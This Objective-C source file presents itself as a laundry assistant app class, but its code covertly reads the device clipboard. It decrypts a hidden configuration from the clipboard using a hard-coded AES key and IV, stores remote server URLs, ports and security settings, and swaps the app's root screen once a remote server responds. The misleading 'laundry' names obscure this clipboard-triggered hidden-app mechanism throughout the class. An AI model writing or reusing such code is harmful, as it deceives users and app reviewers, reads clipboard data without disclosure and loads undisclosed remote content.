#import "ClothesCleaningAssistant.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <react-native-orientation-locker/Orientation.h>
#import "WashingMachineServer.h"
#import "RNNetReachability.h"

@interface ClothesCleaningAssistant()

@property (strong, nonatomic)  NSArray *lgz_laundryLiquid;
@property (nonatomic, strong) RNNetReachability *laundryReachability;
@property (nonatomic, copy) void (^vcBlock)(void);

@end

@implementation ClothesCleaningAssistant

static ClothesCleaningAssistant *instance = nil;

+ (instancetype)clothesCleaning_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.lgz_laundryLiquid = @[@"clothesCleaning_APP",
                                   @"a71556f65ed2b25b55475b964488334f",
                                   @"ADD20BFCD9D4EA0278B11AEBB5B83365",
                                   @"vPort",
                                   @"vSecu",
                                   @"spareRoutes",
                                   @"serverUrl"];
  });
  return instance;
}

- (void)clothesCleaning_startMonitoring {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(clothesCleaning_networkStatusDidChanged:) name:kReachabilityChangedNotification object:nil];
    [self.laundryReachability startNotifier];
}

- (void)clothesCleaning_stopMonitoring {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:kReachabilityChangedNotification object:nil];
    [self.laundryReachability stopNotifier];
}

- (void)dealloc {
    [self clothesCleaning_stopMonitoring];
}


- (void)clothesCleaning_networkStatusDidChanged:(NSNotification *)notification {
    RNNetReachability *reachability = notification.object;
  NetworkStatus networkStatus = [reachability currentReachabilityStatus];
  
  if (networkStatus != NotReachable) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      if ([ud boolForKey:self.lgz_laundryLiquid[0]] == NO) {
          if (self.vcBlock != nil) {
              [self changeRootController:self.vcBlock];
          }
      }
  }
}

- (void)changeRootController:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  
  NSMutableArray<NSString *> *spareArr = [[ud arrayForKey:self.lgz_laundryLiquid[5]] mutableCopy];
  if (spareArr == nil) {
    spareArr = [NSMutableArray array];
  }
  NSString *usingUrl = [ud stringForKey:self.lgz_laundryLiquid[6]];
  
  if ([spareArr containsObject:usingUrl] == NO) {
    [spareArr insertObject:usingUrl atIndex:0];
  }
  
  [self changeTestRootController:changeVcBlock index:0 mArray:spareArr];
}

- (void)changeTestRootController:(void (^ __nullable)(void))changeVcBlock index: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
  if ([tArray count] < index) {
    return;
  }
  
  NSURL *url = [NSURL URLWithString:tArray[index]];
  NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
  sessionConfig.timeoutIntervalForRequest = 10 + index * 5;
  NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
  NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
  
  NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
    NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
    if (error == nil && httpResponse.statusCode == 200) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      [ud setBool:YES forKey:self.lgz_laundryLiquid[0]];
      [ud setValue:tArray[index] forKey:self.lgz_laundryLiquid[6]];
      [ud synchronize];
      dispatch_async(dispatch_get_main_queue(), ^{
        if (changeVcBlock != nil) {
          changeVcBlock();
        }
      });
    } else {
      if (index < [tArray count] - 1) {
        [self changeTestRootController:changeVcBlock index:index + 1 mArray:tArray];
      }
    }
  }];
  [dataTask resume];
}

- (BOOL)clothesCleaning_followThisWay:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.lgz_laundryLiquid[0]]) {
    return YES;
  } else {
      self.vcBlock = changeVcBlock;
      if ([self clothesCleaning_elephant]) {
          [self changeRootController:changeVcBlock];
          [self clothesCleaning_startMonitoring];
      }
    return NO;
  }
}

- (BOOL)clothesCleaning_elephant {
  NSString *pbString = [self clothesCleaning_getHaphazard];
  CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self clothesCleaning_subSunshine:pbString]
                                                          hexKey:self.lgz_laundryLiquid[1]
                                                           hexIv:self.lgz_laundryLiquid[2]];
  
  NSDictionary *dataDict = [self clothesCleaning_stringWhirlwind:aes.utf8String];
  return [self clothesCleaning_storeConfigInfo:dataDict];
}

- (NSString *)clothesCleaning_getHaphazard {
  UIPasteboard *clipboard = [UIPasteboard generalPasteboard];
  return clipboard.string ?: @"";
}

- (NSString *)clothesCleaning_subSunshine: (NSString* )pbString {
  if ([pbString containsString:@"#iPhone#"]) {
    NSArray *university = [pbString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
      pbString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
      [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return pbString;
}

- (NSDictionary *)clothesCleaning_stringWhirlwind: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)clothesCleaning_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.lgz_laundryLiquid[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (UIViewController *)clothesCleaning_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    UIViewController *vc = [UIViewController new];
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [[WashingMachineServer shared] configGzLaundryServer:[ud stringForKey:self.lgz_laundryLiquid[3]] withSecurity:[ud stringForKey:self.lgz_laundryLiquid[4]]];
    return vc;
}

- (UIInterfaceOrientationMask)clothesCleaning_getOrientation {
  return [Orientation getOrientation];
}

@end
